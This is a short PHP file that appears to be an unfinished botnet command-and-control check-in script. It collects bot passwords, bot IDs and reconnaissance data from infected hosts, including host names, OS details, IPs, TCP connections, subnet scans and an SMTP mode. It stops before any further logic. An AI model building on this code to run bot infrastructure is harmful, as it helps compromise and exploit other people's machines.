<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <?php
        // the DB connection
        include_once ("/var/includes/dbConnect.inc");
        // functions used by the scripts
        include_once ("./includes/functions.php");
        /*************************************************
         * retrieve messages from POST
         * the only obligatory one is the bot's password
         *************************************************/
        $botpwd = 
            filter_var($_POST['botpwd'], FILTER_SANITIZE_MAGIC_QUOTES);
        $status = 
            filter_var($_POST['status'], FILTER_SANITIZE_MAGIC_QUOTES);
        $botID =
                filter_var($_POST['botID'], FILTER_SANITIZE_MAGIC_QUOTES);
        $hostName = 
                filter_var($_POST['hostName'], FILTER_SANITIZE_MAGIC_QUOTES);
        $osName = 
                filter_var($_POST['osName'], FILTER_SANITIZE_MAGIC_QUOTES);
        $osVersion = 
                filter_var($_POST['osVersion'], FILTER_SANITIZE_MAGIC_QUOTES);
        $osArch = 
                filter_var($_POST['osArch'], FILTER_SANITIZE_MAGIC_QUOTES);
        $hostUptime = 
                filter_var($_POST['hostUptime'], FILTER_SANITIZE_MAGIC_QUOTES);
        $hostIps = 
                filter_var($_POST['hostIps'], FILTER_SANITIZE_MAGIC_QUOTES);
        $tcpConnections = 
                filter_var($_POST['tcpConnections'], FILTER_SANITIZE_MAGIC_QUOTES);
        $subnetScan = 
                filter_var($_POST['subnetScan'], FILTER_SANITIZE_MAGIC_QUOTES);
        $STMPmode = 
                filter_var($_POST['SMTPmode'], FILTER_SANITIZE_MAGIC_QUOTES);
        /********************************************
         * find out the IP address of the bot
         * and whether is it routed through a proxy 
         *******************************************/
        ?>
    </body>
</html>
